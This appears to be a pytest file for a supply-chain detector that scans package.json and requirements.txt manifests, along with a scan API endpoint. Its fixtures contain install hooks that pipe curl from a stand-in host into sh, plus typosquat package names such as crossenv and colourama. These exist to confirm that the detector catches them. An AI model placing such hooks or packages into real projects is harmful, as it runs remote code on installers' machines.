"""Dependency-manifest supply-chain scan: dep_guard detector + /api/scan/deps."""

from __future__ import annotations

import json

from app.detectors import dep_guard
from app.detectors.base import AnalysisInput, Category, Surface


def _scan(content, subject="package.json"):
    return dep_guard.DepGuardDetector().analyze(
        AnalysisInput(content=content, subject=subject, surface=Surface.DEPS))


def _cats(sigs):
    return {s.category for s in sigs}


def test_malicious_install_script():
    pkg = json.dumps({"name": "x", "scripts": {
        "postinstall": "curl http://evil.sh/x | sh"}})
    sigs = _scan(pkg)
    assert Category.DEPENDENCY_RISK in _cats(sigs)
    assert any("install script" in s.title.lower() for s in sigs)


def test_non_registry_source_package_json():
    pkg = json.dumps({"dependencies": {"good": "^1.0.0", "sketchy": "git+https://x.dev/a.git"}})
    sigs = _scan(pkg)
    assert any("non-registry" in s.title.lower() for s in sigs)


def test_known_bad_package():
    pkg = json.dumps({"dependencies": {"crossenv": "1.0.0"}})
    sigs = _scan(pkg)
    assert any("known-bad" in s.title.lower() for s in sigs)


def test_requirements_txt():
    reqs = "requests==2.31.0\ncolourama==0.1\n-e git+https://x/y.git#egg=z\n"
    sigs = _scan(reqs, subject="requirements.txt")
    titles = " ".join(s.title.lower() for s in sigs)
    assert "known-bad" in titles          # colourama (typosquat of colorama)
    assert "non-registry" in titles       # the -e git+ line


def test_clean_manifest():
    pkg = json.dumps({"name": "app", "dependencies": {"react": "^18.3.1", "vite": "^6.0.0"},
                      "scripts": {"build": "vite build", "test": "vitest"}})
    assert _scan(pkg) == []


def test_scan_deps_endpoint(client, raw_client):
    key = client.post("/api/apikeys", json={"label": "deps", "actor": "ci@acme.com"}).json()["token"]
    r = raw_client.post("/api/scan/deps", headers={"X-Warden-Token": key}, json={"files": [
        {"path": "package.json", "content": json.dumps({"scripts": {"preinstall": "curl http://e|sh"}})},
        {"path": "clean.json", "content": json.dumps({"dependencies": {"react": "^18"}})},
    ]})
    body = r.json()
    assert body["action"] in ("warn", "block")
    flagged = {f["path"] for f in body["files"]}
    assert "package.json" in flagged and "clean.json" not in flagged
